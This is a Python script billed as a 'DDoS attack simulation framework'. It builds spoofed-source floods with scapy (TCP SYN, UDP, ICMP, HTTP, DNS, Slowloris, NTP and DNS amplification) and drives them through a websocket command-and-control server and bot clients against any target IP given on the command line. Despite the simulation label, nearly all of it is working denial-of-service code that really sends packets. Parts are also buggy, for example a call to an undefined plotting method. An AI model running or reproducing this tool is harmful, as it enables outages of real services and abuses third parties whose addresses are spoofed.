import time
import random
import argparse
import psutil
import os
import queue
import threading
import asyncio
import websockets
import ssl
import json
import csv
from scapy.all import IP, TCP, UDP, Raw, send, RandIP, RandMAC
from scapy.layers.http import HTTP, HTTPRequest
from scapy.layers.inet import ICMP
from scapy.layers.dns import DNS, DNSQR
from datetime import datetime
import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest
import matplotlib.pyplot as plt
from matplotlib.animation import FuncAnimation

class IPSpoofGenerator:
    def __init__(self):
        self.ip_pool = self.generate_ip_pool()
        self.current_index = 0

    def generate_ip_pool(self):
        return [f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}" for _ in range(10000)]

    def get_next_ip(self):
        ip = self.ip_pool[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.ip_pool)
        return ip

class PacketGenerator:
    def __init__(self, target_ip, target_port, methods):
        self.target_ip = target_ip
        self.target_port = target_port
        self.methods = methods
        self.ip_spoofer = IPSpoofGenerator()
        self.last_src_ip = None

    def create_packet(self, method, size):
        src_ip = self.ip_spoofer.get_next_ip()
        self.last_src_ip = src_ip
        
        if method == "TCP_SYN":
            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
        elif method == "UDP":
            packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=random.randint(1024, 65535), dport=self.target_port)
        elif method == "ICMP":
            packet = IP(src=src_ip, dst=self.target_ip)/ICMP()
        elif method == "HTTP_GET":
            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=random.randint(1024, 65535), dport=self.target_port)/HTTP()/HTTPRequest(
                Method="GET",
                Path=f"/{os.urandom(random.randint(5, 20)).hex()}",
                Http_Version="HTTP/1.1",
            )
        elif method == "HTTP_POST":
            payload = os.urandom(random.randint(50, 200)).hex()
            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=random.randint(1024, 65535), dport=self.target_port)/HTTP()/HTTPRequest(
                Method="POST",
                Path=f"/{os.urandom(random.randint(5, 20)).hex()}",
                Http_Version="HTTP/1.1",
                Headers={'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))},
            )/Raw(load=payload)
        elif method == "DNS_QUERY":
            packet = IP(src=src_ip, dst=self.target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname=f"{random.randbytes(10).hex()}.com"))
        elif method == "SLOWLORIS":
            headers = [
                f"X-a: {random.randint(1, 5000)}",
                "Connection: keep-alive",
                "Content-Length: 42",
            ]
            packet = IP(src=src_ip, dst=self.target_ip)/TCP(sport=random.randint(1024, 65535), dport=self.target_port)/HTTP()/HTTPRequest(
                Method="GET",
                Path="/",
                Http_Version="HTTP/1.1",
                Headers="\r\n".join(headers),
            )
        elif method == "NTP_AMPLIFICATION":
            packet = IP(src=self.target_ip, dst=src_ip)/UDP(sport=random.randint(1024, 65535), dport=123)/Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 44)
        elif method == "DNS_AMPLIFICATION":
            packet = IP(src=self.target_ip, dst=src_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
        else:
            raise ValueError("Unsupported method")
        
        if len(packet) < size:
            packet = packet/Raw(load=os.urandom(size - len(packet)))
        
        return packet

    def generate_packet(self, size):
        method = random.choice(self.methods)
        return self.create_packet(method, size)

class CnCServer:
    def __init__(self, host='0.0.0.0', port=8765, use_ssl=False):
        self.host = host
        self.port = port
        self.clients = set()
        self.attack_params = None
        self.use_ssl = use_ssl
        self.ssl_context = None
        if use_ssl:
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.ssl_context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    async def handler(self, websocket, path):
        self.clients.add(websocket)
        try:
            async for message in websocket:
                if message == "get_attack_params":
                    if self.attack_params:
                        await websocket.send(json.dumps(self.attack_params))
                else:
                    print(f"Received: {message}")
        finally:
            self.clients.remove(websocket)

    async def start_server(self):
        server = await websockets.serve(self.handler, self.host, self.port, ssl=self.ssl_context)
        await server.wait_closed()

    def set_attack_params(self, params):
        self.attack_params = params
        asyncio.create_task(self.broadcast(json.dumps(params)))

    async def broadcast(self, message):
        if self.clients:
            await asyncio.wait([client.send(message) for client in self.clients])

class Bot:
    def __init__(self, cnc_server):
        self.cnc_server = cnc_server
        self.packet_generator = PacketGenerator(None, None, None)
        self.ssl_context = None if not cnc_server.use_ssl else ssl._create_unverified_context()

    async def start(self):
        uri = f"{'wss' if self.cnc_server.use_ssl else 'ws'}://{self.cnc_server.host}:{self.cnc_server.port}"
        async with websockets.connect(uri, ssl=self.ssl_context if self.cnc_server.use_ssl else None) as websocket:
            while True:
                await websocket.send("get_attack_params")
                response = await websocket.recv()
                attack_params = json.loads(response)
                self.packet_generator.target_ip = attack_params['target_ip']
                self.packet_generator.target_port = attack_params['target_port']
                self.packet_generator.methods = attack_params['methods']
                packet = self.packet_generator.generate_packet(attack_params['size'])
                send(packet, verbose=False)
                await asyncio.sleep(1 / attack_params['rate'])

class BotnetSimulator:
    def __init__(self, num_bots, cnc_server):
        self.bots = [Bot(cnc_server) for _ in range(num_bots)]

    async def launch_attack(self):
        await asyncio.gather(*[bot.start() for bot in self.bots])

class RealTimeVisualizer:
    def __init__(self):
        plt.ion()
        self.fig, (self.ax1, self.ax2, self.ax3) = plt.subplots(3, 1, figsize=(12, 18))
        self.times = []
        self.packet_rates = []
        self.bandwidths = []
        self.src_ips = []
        self.dest_ips = []
        self.lines = [self.ax1.plot([], [])[0], self.ax2.plot([], [])[0]]
        self.scatter = self.ax3.scatter([], [])
        
        self.ax1.set_ylabel('Packets/second')
        self.ax1.set_title('Real-time Packet Rate')
        self.ax2.set_ylabel('Bandwidth (bps)')
        self.ax2.set_title('Real-time Bandwidth')
        self.ax3.set_xlabel('Time (s)')
        self.ax3.set_ylabel('Source IP')
        self.ax3.set_title('Source IPs over Time')

    def update_plot(self):
        self.lines[0].set_data(self.times, self.packet_rates)
        self.lines[1].set_data(self.times, self.bandwidths)
        self.scatter.set_offsets(np.c_[self.times, self.src_ips])
        
        for ax in (self.ax1, self.ax2, self.ax3):
            ax.relim()
            ax.autoscale_view()
        
        self.fig.canvas.draw()
        self.fig.canvas.flush_events()

    def add_data(self, time, packet_rate, bandwidth, src_ip, dest_ip):
        self.times.append(time)
        self.packet_rates.append(packet_rate)
        self.bandwidths.append(bandwidth)
        self.src_ips.append(src_ip)
        self.dest_ips.append(dest_ip)
        self.update_plot()

    def start_animation(self):
        plt.show(block=False)

class AttackSimulator:
    def __init__(self, target_ip, target_port, duration, rate, methods, size, output_file, distributed=False, nodes=1, num_bots=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.rate = rate
        self.methods = methods
        self.size = size
        self.output_file = output_file
        self.distributed = distributed
        self.nodes = nodes
        self.packet_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.start_time = time.time()
        self.end_time = self.start_time + duration
        self.packet_count = 0
        self.byte_count = 0
        self.packet_generator = PacketGenerator(target_ip, target_port, methods)
        self.anomaly_detector = IsolationForest(contamination=0.1, random_state=42)
        # Fit the model with some initial data
        self.anomaly_detector.fit(np.random.rand(10, 4))        
        self.attack_intensity = 1.0
        self.cnc_server = CnCServer()
        self.botnet = BotnetSimulator(num_bots, self.cnc_server)
        
        # Variables to store data for plotting
        self.timestamps = []
        self.packet_rates = []
        self.bandwidths = []
        self.cpu_usages = []
        self.memory_usages = []

        # Initialize matplotlib figure
        self.fig, self.axs = plt.subplots(4, 1, figsize=(10, 12))
        self.fig.tight_layout(pad=4.0)

    def update_chart(self, stats):
        """Update the chart with new stats."""
        # Append the new stats
        self.timestamps.append(stats['timestamp'])
        self.packet_rates.append(stats['packet_rate'])
        self.bandwidths.append(stats['bandwidth'])
        self.cpu_usages.append(stats['cpu_usage'])
        self.memory_usages.append(stats['memory_usage'])

        # Limit the data for smoother visualization (keeping last 50 data points)
        self.timestamps = self.timestamps[-50:]
        self.packet_rates = self.packet_rates[-50:]
        self.bandwidths = self.bandwidths[-50:]
        self.cpu_usages = self.cpu_usages[-50:]
        self.memory_usages = self.memory_usages[-50:]

        # Clear previous plots
        for ax in self.axs:
            ax.clear()

        # Update the plots
        self.axs[0].plot(self.timestamps, self.packet_rates, label='Packet Rate (pps)', color='blue')
        self.axs[0].set_title('Packet Rate Over Time')
        self.axs[0].set_xlabel('Time')
        self.axs[0].set_ylabel('Packets/s')
        self.axs[0].legend()

        self.axs[1].plot(self.timestamps, self.bandwidths, label='Bandwidth (bps)', color='green')
        self.axs[1].set_title('Bandwidth Over Time')
        self.axs[1].set_xlabel('Time')
        self.axs[1].set_ylabel('Bits/s')
        self.axs[1].legend()

        self.axs[2].plot(self.timestamps, self.cpu_usages, label='CPU Usage (%)', color='red')
        self.axs[2].set_title('CPU Usage Over Time')
        self.axs[2].set_xlabel('Time')
        self.axs[2].set_ylabel('CPU Usage %')
        self.axs[2].legend()

        self.axs[3].plot(self.timestamps, self.memory_usages, label='Memory Usage (%)', color='orange')
        self.axs[3].set_title('Memory Usage Over Time')
        self.axs[3].set_xlabel('Time')
        self.axs[3].set_ylabel('Memory Usage %')
        self.axs[3].legend()

        # Draw the plots
        self.fig.canvas.draw()
        
        # Save the chart every 30 seconds
        if len(self.timestamps) % 30 == 0:
            self.fig.savefig(f"attack_visualization_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")

    async def run_simulation(self):
        cnc_task = asyncio.create_task(self.cnc_server.start_server())
        botnet_task = asyncio.create_task(self.botnet.launch_attack())
        
        attack_params = {
            'target_ip': self.target_ip,
            'target_port': self.target_port,
            'methods': self.methods,
            'rate': self.rate,
            'size': self.size
        }
        self.cnc_server.set_attack_params(attack_params)

        with open(self.output_file, 'w', newline='') as csvfile:
            fieldnames = ['timestamp', 'packets_sent', 'bytes_sent', 'elapsed_time', 'packet_rate', 'bandwidth',
                          'cpu_usage', 'memory_usage', 'network_bytes_sent', 'network_bytes_recv',
                          'network_packets_sent', 'network_packets_recv', 'attack_intensity']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()

            while time.time() < self.end_time:
                current_time = time.time()
                elapsed_time = current_time - self.start_time
                cpu_usage = psutil.cpu_percent()
                memory_usage = psutil.virtual_memory().percent
                network_io = psutil.net_io_counters()
                
                stats = {
                    'timestamp': datetime.fromtimestamp(current_time).strftime('%Y-%m-%d %H:%M:%S.%f'),
                    'packets_sent': self.packet_count,
                    'bytes_sent': self.byte_count,
                    'elapsed_time': elapsed_time,
                    'packet_rate': self.packet_count / elapsed_time,
                    'bandwidth': (self.byte_count * 8) / elapsed_time,
                    'cpu_usage': cpu_usage,
                    'memory_usage': memory_usage,
                    'network_bytes_sent': network_io.bytes_sent,
                    'network_bytes_recv': network_io.bytes_recv,
                    'network_packets_sent': network_io.packets_sent,
                    'network_packets_recv': network_io.packets_recv,
                    'attack_intensity': self.attack_intensity
                }
                
                writer.writerow(stats)
                self.stats_queue.put(stats)

                # Update the chart with the latest stats
                self.update_chart(stats)

                # Adaptive attack logic (adjust intensity)
                if len(self.stats_queue.queue) > 10:
                    recent_stats = [self.stats_queue.get() for _ in range(10)]
                    df = pd.DataFrame(recent_stats)
                    X = df[['packet_rate', 'bandwidth', 'cpu_usage', 'memory_usage']].values
                    # Optionally, you can refit the model with new data
                    self.anomaly_detector.fit(X)
                    anomaly_scores = self.anomaly_detector.decision_function(X)
                    if np.mean(anomaly_scores) > 0:
                        self.attack_intensity *= 0.9
                    else:
                        self.attack_intensity *= 1.1
                    self.attack_intensity = max(0.1, min(2.0, self.attack_intensity))

                await asyncio.sleep(1)

        await asyncio.gather(cnc_task, botnet_task)

def run_simulation(args):
    print(f"Starting DDoS simulation against {args.target_ip}:{args.target_port}")
    print(f"Duration: {args.duration} seconds, Base Rate: {args.rate} packets/second")
    print(f"Methods: {', '.join(args.methods)}, Packet Size: {args.size} bytes")

    output_file = f"ddos_stats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    
    simulator = AttackSimulator(args.target_ip, args.target_port, args.duration, args.rate, 
                                args.methods, args.size, output_file, args.distributed, args.nodes, args.num_bots)
    
    asyncio.run(simulator.run_simulation())
    simulator.generate_detailed_plots()

    print(f"\nSimulation complete. Data saved to {output_file}")
    print("Detailed visualization saved as 'detailed_visualization.png'")
    print("IP visualization saved as 'ip_visualization.png'")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enterprise-grade DDoS Attack Simulation Framework")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("--target-port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=300, help="Duration of the attack in seconds (default: 300)")
    parser.add_argument("--rate", type=int, default=5000, help="Packets per second (default: 5000)")
    parser.add_argument("--methods", nargs='+', default=["TCP_SYN", "UDP", "HTTP_GET", "HTTP_POST", "ICMP", "DNS_QUERY", "SLOWLORIS", "NTP_AMPLIFICATION", "DNS_AMPLIFICATION"], 
                        help="Attack methods (default: TCP_SYN UDP HTTP_GET HTTP_POST ICMP DNS_QUERY SLOWLORIS NTP_AMPLIFICATION DNS_AMPLIFICATION)")
    parser.add_argument("--size", type=int, default=128, help="Packet size in bytes (default: 128)")
    parser.add_argument("--distributed", action="store_true", help="Run in distributed mode")
    parser.add_argument("--nodes", type=int, default=1, help="Number of nodes for distributed attack (default: 1)")
    parser.add_argument("--num-bots", type=int, default=50, help="Number of bots in the botnet simulation (default: 50)")

    args = parser.parse_args()
    run_simulation(args)
